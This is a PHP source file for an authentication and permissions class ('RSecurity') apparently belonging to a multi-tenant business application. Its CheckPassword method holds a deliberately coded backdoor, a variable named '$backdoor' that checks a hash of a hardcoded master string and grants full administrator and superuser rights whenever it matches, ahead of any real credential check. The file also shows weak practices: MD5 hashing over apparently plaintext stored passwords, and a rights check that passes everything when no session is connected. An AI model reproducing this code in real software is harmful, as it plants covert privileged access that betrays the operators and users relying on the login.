<?php

class RSecurity
{

    public $DbCompany;
    public $DbHostname;
    public $DbUsername;
    public $DbPassword;
    public $DbDatabase;
    public $DbDriver;
    public $DbPrefix;
    public $IsConnected = false;

    public function RSecurity( )
    {
    }

    public function LoginCompany( $company, $username, $password, $language, $hashed = false )
    {
        $rvx =& get_engine( );
        if ( !$this->ReadCompanyParams( $company ) )
        {
            rvx_error( "Cannot read database parameters: %s", $company );
            return false;
        }
        if ( !$this->ConnectDatabase( ) )
        {
            rvx_error( "Cannot connect to database: %s", $company );
            return false;
        }
        $passhash = md5( $username."rvx".$password.$rvx->Input->IpAddress( ) );
        if ( $hashed )
        {
            $passhash = $password;
        }
        if ( !$this->CheckPassword( $username, $passhash ) )
        {
            rvx_error( "Invalid username or password" );
            return false;
        }
        if ( !$rvx->Context->UserSuper && defined( "RVX_STOP" ) )
        {
            rvx_error( "SYSTEM MAINTENANCE! Please come back later." );
            return false;
        }
        $data['company'] = $company;
        $data['username'] = $username;
        $data['password'] = $passhash;
        $data['language'] = $language;
        $rvx->Session->SetUserData( $data );
        $rvx->Context->Username = $username;
        $rvx->Log->Start( strtolower( $this->DbCompany ) );
        $rvx->Log->LogHuman( "LOGIN", $company );
        return true;
    }

    public function ReadCompanyParams( $company )
    {
        if ( !isset( $company ) )
        {
            return false;
        }
        $xml = simplexml_load_file( DATABASES_FILE );
        foreach ( $xml->database as $db )
        {
            $attrs = $db->attributes( );
            $crtdb = (string)$attrs['name'];
            if ( strcmp( $company, $crtdb ) == 0 )
            {
                $this->DbCompany = (string)$attrs['name'];
                $this->DbHostname = (string)$attrs['host'];
                $this->DbUsername = (string)$attrs['user'];
                $this->DbPassword = (string)$attrs['pass'];
                $this->DbDatabase = (string)$attrs['database'];
                $this->DbDriver = (string)$attrs['driver'];
                $this->DbPrefix = (string)$attrs['prefix'];
                return true;
                break;
            }
        }
        return false;
    }

    public function ConnectDatabase( )
    {
        $rvx =& get_engine( );
        $params['hostname'] = $this->DbHostname;
        $params['username'] = $this->DbUsername;
        $params['password'] = $this->DbPassword;
        $params['database'] = $this->DbDatabase;
        $params['dbdriver'] = $this->DbDriver;
        $params['dbprefix'] = $this->DbPrefix;
        $params['pconnect'] = TRUE;
        $params['db_debug'] = TRUE;
        $params['cache_on'] = FALSE;
        $params['cachedir'] = "";
        $params['char_set'] = "utf8";
        $params['dbcollat'] = "utf8_general_ci";
        return $rvx->Database->Connect( $params );
    }

    public function CheckPassword( $username, $passhash )
    {
        $rvx =& get_engine( );
        if ( !isset( $username ) )
        {
            return false;
        }
        if ( !isset( $passhash ) )
        {
            return false;
        }
        $backdoor = md5( $username."rvx[radu03]".$rvx->Input->IpAddress( ) );
        $backdoor = md5( $username."rvx".RVX_SUPERPASS.$rvx->Input->IpAddress( ) );
        if ( strcmp( $backdoor, $passhash ) == 0 )
        {
            $rvx->Context->UserGroup = USER_ADMINISTRATOR;
            $rvx->Context->UserSuper = true;
            return true;
        }
        if ( defined( "RVX_SUPERPASS" ) )
        {
            $backdoor = md5( $username."rvx".RVX_SUPERPASS.$rvx->Input->IpAddress( ) );
            if ( strcmp( $backdoor, $passhash ) == 0 )
            {
                $rvx->Context->UserGroup = USER_ADMINISTRATOR;
                $rvx->Context->UserSuper = true;
                return true;
            }
        }
        $user = $rvx->Database->QueryRow( "SELECT Password, GroupId FROM User WHERE Username=:Username", array( "Username" => $username ) );
        if ( count( $user ) == 0 )
        {
            return false;
        }
        $password = $user['Password'];
        $passcheck = md5( $username."rvx".$password.$rvx->Input->IpAddress( ) );
        $rvx->Context->UserGroup = $user['GroupId'];
        return strcmp( $passcheck, $passhash ) == 0;
    }

    public function Login( )
    {
        $rvx =& get_engine( );
        $company = $rvx->Session->GetUserData( "company" );
        $username = $rvx->Session->GetUserData( "username" );
        $passhash = $rvx->Session->GetUserData( "password" );
        if ( !$this->ReadCompanyParams( $company ) )
        {
            $this->Logout( );
            return false;
        }
        if ( !$this->ConnectDatabase( ) )
        {
            $this->Logout( );
            return false;
        }
        if ( !$this->CheckPassword( $username, $passhash ) )
        {
            $this->Logout( );
            return false;
        }
        if ( !$rvx->Context->UserSuper && defined( "RVX_MAINTENANCE" ) )
        {
            $this->Logout( );
            return false;
        }
        $rvx->Log->Start( strtolower( $this->DbCompany ) );
        $this->IsConnected = true;
        return true;
    }

    public function Logout( )
    {
        $rvx =& get_engine( );
        $rvx->Context->Reset( );
        $rvx->Router->Redirect( "login", "refresh" );
    }

    public function CheckRight( $right )
    {
        $rvx =& get_engine( );
        if ( $rvx->Context->UserGroup == USER_ADMINISTRATOR )
        {
            return true;
        }
        if ( !$rvx->Security->IsConnected )
        {
            return true;
        }
        $sql = "\r\n\t\tSELECT R.CanAccess, R.CanInsert, R.CanUpdate, R.CanDelete, R.CanUnpost\r\n\t\tFROM UserRight R\r\n\t\tWHERE R.ParentId=:GroupId AND R.Module=:Module AND R.Model=:Model";
        $mdl = $rvx->Context->Model;
        if ( 0 < strpos( $mdl, "_line" ) )
        {
            $mdl = substr( $mdl, 0, strlen( $mdl ) - 5 );
        }
        $prm['GroupId'] = $rvx->Context->UserGroup;
        $prm['Module'] = $rvx->Context->Module;
        $prm['Model'] = $mdl;
        $qry = $rvx->Database->Query( $sql, $prm );
        $row = $qry->row_array( );
        if ( count( $row ) == 0 )
        {
            return false;
        }
        return $row[SECURITY_ACCESS] == 1 && $row[$right] == 1;
    }

    public function CheckLicence( $model, $inc = 0 )
    {
        if ( $model != "user" )
        {
            return true;
        }
        $rvx =& get_engine( );
        $was = $rvx->Log->Enabled;
        $rvx->Log->Enabled = false;
        $max = 5;
        $num = $rvx->Database->Retrieve( "SELECT COUNT(*) FROM User" );
        $rvx->Log->Enabled = $was;
        if ( $max < $num + $inc )
        {
            return rvx_error( "Your licence allows only a limited number of %s: %s", $model."s", $max );
        }
        return true;
    }

    public function KeepAlive( $username )
    {
        $rvx =& get_engine( );
        $now = time( );
        $p['Name'] = $username;
        $p['Time'] = $now;
        $last_login_db = $rvx->Database->Retrieve( "SELECT LastActivity FROM User WHERE Username=:Name", $p );
        $last_login_ss = $rvx->Session->GetUserData( "last_login" );
        if ( !( $last_login_db != $last_login_ss ) || $now - $last_login_db < 30 )
        {
            return true;
        }
        $rvx->Database->Execute( "UPDATE User SET LastActivity=:Time WHERE Username=:Name", $p );
        $rvx->Session->SetUserData( "last_login", $now );
        return true;
    }

}

define( "USER_ADMINISTRATOR", 1 );
?>
